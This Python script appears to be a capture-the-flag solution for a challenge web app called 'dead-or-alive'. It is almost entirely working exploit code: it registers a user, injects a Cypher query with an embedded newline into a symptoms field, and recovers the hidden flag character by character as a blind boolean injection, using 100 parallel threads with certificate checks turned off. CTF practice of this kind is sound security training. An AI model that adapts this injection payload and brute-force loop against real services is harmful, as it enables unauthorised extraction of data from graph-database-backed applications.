import requests
import random
import string
import concurrent.futures

url = "http://dead-or-alive.ctfz.one"

def try_character(character):
    with requests.Session() as session:
        ssn = ''.join(random.choices(string.ascii_letters + string.digits, k=3))
        session.post(url + '/api/setUser', json={"ssn": ssn, "fullname": "abc90", "dateOfBirth": "1/1/1999", "weight": "100"}, verify=False)
        payload = "Fatigue']\u000aMATCH (f:Flag) WHERE f.flag STARTS WITH 'ctfzone{N0w_Y0u_4re_C0mpl3t3ly_H34lTy####'//".replace("####", character)
        session.post(url + '/api/setSymptoms', json={"ssn": ssn, "symptoms": ["Anxiety", "Obsessions", "Difficulty concentrating", "Compulsions", payload]}, verify=False)
        r = session.post(url + '/api/getDiagnosis', json={"ssn": ssn}, verify=False)
        if "Obsessive-compulsive disorder (OCD)" in r.text:
            return character
        return None

def main():
    flag = ""
    all_characters = string.ascii_letters + string.digits + string.punctuation
    print('chars: ', all_characters)
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        results = list(executor.map(try_character, all_characters))
        
    for result in results:
        if result is not None:
            flag += result
            print("Current flag:", flag)
    
    print("Flag:", flag)

if __name__ == "__main__":
    main()
